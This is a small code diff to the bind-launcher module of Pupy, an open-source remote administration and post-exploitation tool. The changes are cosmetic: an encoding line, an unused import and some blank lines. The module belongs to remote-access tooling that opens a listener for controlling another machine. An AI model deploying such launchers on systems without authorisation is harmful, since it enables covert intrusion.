@@ -1,13 +1,8 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-
 from ..base_launcher import *
-try:
-    import ConfigParser as configparser
-except ImportError:
-    import configparser
 
 class BindLauncher(BaseLauncher):
     """ start a simple bind launcher with the specified transport """
@@ -44,6 +39,3 @@ class BindLauncher(BaseLauncher):
             authenticator=None
 
         yield (t.server, self.args.port, self.args.host, authenticator, t.stream, t.server_transport, transport_kwargs)
-
-
-
